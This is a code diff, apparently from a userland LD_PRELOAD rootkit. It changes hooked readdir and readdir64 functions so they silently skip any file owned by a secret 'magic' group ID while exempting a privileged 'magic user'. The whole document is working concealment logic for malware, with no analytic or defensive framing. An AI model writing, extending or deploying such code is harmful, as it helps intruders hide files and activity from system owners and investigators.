@@ -3,8 +3,10 @@ struct dirent *readdir(DIR *dirp){
     struct dirent *dir;
     size_t pathlen;
     int df = dirfd(dirp);
+    gid_t magicgid = readgid();
+    struct stat sbuf;
 
-    hook(CREADDIR);
+    hook(CREADDIR, C__XSTAT);
 
     while((dir = call(CREADDIR, dirp)) != NULL){
         if(magicusr()){
@@ -33,10 +35,13 @@ struct dirent *readdir(DIR *dirp){
         snprintf(path, sizeof(path), "%s/%s", filename, dir->d_name);
         free(filename);
 
-        if(hidden_path(path))
+        memset(&sbuf, 0, sizeof(struct stat));
+        if((long)call(C__XSTAT, _STAT_VER, path, &sbuf) < 0)
             continue;
-        
-        break;
+
+        if(sbuf.st_gid == magicgid)
+            continue;
+        else break;
     }
 
     return dir;
@@ -47,8 +52,10 @@ struct dirent64 *readdir64(DIR *dirp){
     struct dirent64 *dir;
     size_t pathlen;
     int df = dirfd(dirp);
+    gid_t magicgid = readgid();
+    struct stat sbuf;
 
-    hook(CREADDIR64);
+    hook(CREADDIR64, C__XSTAT);
 
     while((dir = call(CREADDIR64, dirp)) != NULL){
         if(magicusr()){
@@ -79,10 +86,13 @@ struct dirent64 *readdir64(DIR *dirp){
         snprintf(path, sizeof(path), "%s/%s", filename, dir->d_name);
         free(filename);
 
-        if(hidden_path(path))
+        memset(&sbuf, 0, sizeof(struct stat));
+        if((long)call(C__XSTAT, _STAT_VER, path, &sbuf) < 0)
             continue;
-        
-        break;
+
+        if(sbuf.st_gid == magicgid)
+            continue;
+        else break;
     }
 
     return dir;
